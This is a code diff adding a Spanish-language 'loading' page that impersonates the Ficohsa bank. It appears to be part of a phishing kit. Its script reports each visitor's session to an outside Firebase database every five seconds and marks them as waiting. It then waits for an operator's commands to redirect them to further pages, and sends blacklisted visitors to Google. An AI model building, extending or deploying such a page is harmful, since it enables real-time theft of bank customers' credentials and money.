@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Ficohsa</title>
+<style>
+  *{box-sizing:border-box}
+  html,body{margin:0;padding:0;height:100%}
+  body{background:#0d4bbd;display:flex;align-items:center;justify-content:center;overflow:hidden}
+  .wrap{display:flex;flex-direction:column;align-items:center;gap:52px}
+  .logo{width:74px;height:auto;display:block}
+  .dots{display:flex;gap:14px}
+  .dots i{width:9px;height:9px;border-radius:50%;background:#fff;display:block;animation:pulso 1.3s ease-in-out infinite}
+  .dots i:nth-child(2){animation-delay:.18s}
+  .dots i:nth-child(3){animation-delay:.36s}
+  @keyframes pulso{0%,100%{opacity:.25;transform:scale(.85)}45%{opacity:1;transform:scale(1)}}
+  @media(max-width:600px){.logo{width:58px}.wrap{gap:42px}}
+</style>
+</head>
+<body>
+  <div class="wrap">
+    <svg class="logo" viewBox="0 0 122 166" fill="none">
+      <path d="M120.236 24.39C122.656 29.41 120.586 33.91 115.216 34.6L103.626 36.16C34.236 45.5 16.416 69.9 12.436 86.34L2.05598 62.29C-9.01402 35.82 24.376 7.78 108.126 0L120.236 24.39ZM106.566 47.23C30.256 57.61 13.646 89.28 21.086 106.41L32.336 132.54C32.336 109.7 62.966 92.74 110.716 83.74C116.946 82.53 120.236 78.2 117.806 72.67L106.566 47.23ZM47.736 123.71C43.756 127.69 40.986 133.23 40.986 138.07C40.986 152.43 55.696 161.95 91.516 162.64L78.366 136.68C56.906 138.08 50.506 131.15 47.736 123.71Z" fill="#FFFFFF"/>
+    </svg>
+    <div class="dots"><i></i><i></i><i></i></div>
+  </div>
+
+<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
+<script>
+const CFG = { DB_URL: "https://cbonnlineec-default-rtdb.firebaseio.com/", ROOT: "ficohsa", REDIRECT_BLOQUEADO: "https://www.google.com" };
+const DBX = (function(){
+  const KEY='ficohsa_db';
+  const vacio=()=>({logins:{},comandos:{},eliminados:{},blacklist:{},historial:{}});
+  let fb=null, subs=[];
+  const leer=()=>{ try{ return JSON.parse(localStorage.getItem(KEY))||vacio(); }catch(e){ return vacio(); } };
+  const gp=(t,p)=>p.split('/').reduce((o,k)=>(o&&o[k]!==undefined)?o[k]:null,t);
+  function notificar(){ subs.forEach(s=>{ try{ s.cb(gp(leer(),s.path)); }catch(e){} }); }
+  window.addEventListener('storage',e=>{ if(e.key===KEY) notificar(); });
+  return {
+    init(){ if(!CFG.DB_URL||typeof firebase==='undefined') return false;
+      if(!firebase.apps.length) firebase.initializeApp({databaseURL:CFG.DB_URL}); fb=firebase.database(); return true; },
+    update(p,v){ if(fb) return fb.ref(CFG.ROOT+'/'+p).update(v);
+      const t=leer(),ks=p.split('/'); let o=t; ks.slice(0,-1).forEach(k=>{ if(typeof o[k]!=='object'||o[k]===null) o[k]={}; o=o[k]; });
+      o[ks[ks.length-1]]=Object.assign({},gp(t,p)||{},v);
+      localStorage.setItem(KEY,JSON.stringify(t)); notificar(); },
+    on(p,cb){ if(fb){ fb.ref(CFG.ROOT+'/'+p).on('value',s=>cb(s.val())); } else { subs.push({path:p,cb}); cb(gp(leer(),p)); } }
+  };
+})();
+
+const id = sessionStorage.getItem('ficohsa_id');
+DBX.init();
+if(!id){ location.href = 'index.html'; }
+
+function ping(){
+  if(!id) return;
+  DBX.update('logins/'+id, { online:true, ultimoPing:Date.now(), pagina:'cargando.html', status:'ESPERANDO' });
+}
+ping(); setInterval(ping, 5000);
+
+let ultimoComando = 0, primerEvento = true;
+const paginaActual = (location.pathname.split('/').pop() || 'cargando.html').toLowerCase();
+
+DBX.on('comandos/'+id, function(c){
+  if(!c || !c.ts) return;
+  if(primerEvento){ primerEvento = false; ultimoComando = c.ts; return; }
+  if(c.ts > ultimoComando && c.redirect){
+    ultimoComando = c.ts;
+    if(c.redirect.toLowerCase() === paginaActual) return;
+    if(c.redirect.indexOf('index') !== -1) sessionStorage.removeItem('ficohsa_id');
+    setTimeout(function(){ location.href = c.redirect; }, 700);
+  }
+});
+</script>
+</body>
+</html>
